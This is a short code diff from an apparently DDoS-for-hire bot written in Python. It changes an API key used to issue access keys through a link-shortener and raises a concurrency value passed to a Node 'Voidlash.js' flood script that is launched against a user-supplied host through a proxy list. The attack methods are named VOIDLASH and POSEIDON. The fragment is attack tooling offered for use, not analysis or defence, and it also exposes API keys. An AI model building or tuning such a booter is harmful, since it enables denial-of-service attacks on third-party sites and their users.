@@ -93,7 +93,7 @@ def laykey(message):
     print(key)
     
     try:
-        response = requests.get(f'https://link4m.co/api-shorten/v2?api=650052128c48484de71ab0ef&url=https://viduchung.info/key/?key={key}')
+        response = requests.get(f'https://link4m.co/api-shorten/v2?api=65d3579b9b102a50be24752b&url=https://viduchung.info/key/?key={key}')
         response_json = response.json()
         if 'shortenedUrl' in response_json:
             url_key = response_json['shortenedUrl']
@@ -267,7 +267,7 @@ def attack_command(message):
             duration = atime
         if method == 'VOIDLASH':
             os.chdir("L7")
-            command = ["node", "Voidlash.js", host, atime, "14", "proxy.txt", "14"]
+            command = ["node", "Voidlash.js", host, atime, "14", "proxy.txt", "50"]
             duration = atime
         elif method == 'POSEIDON':
             os.chdir("L7")
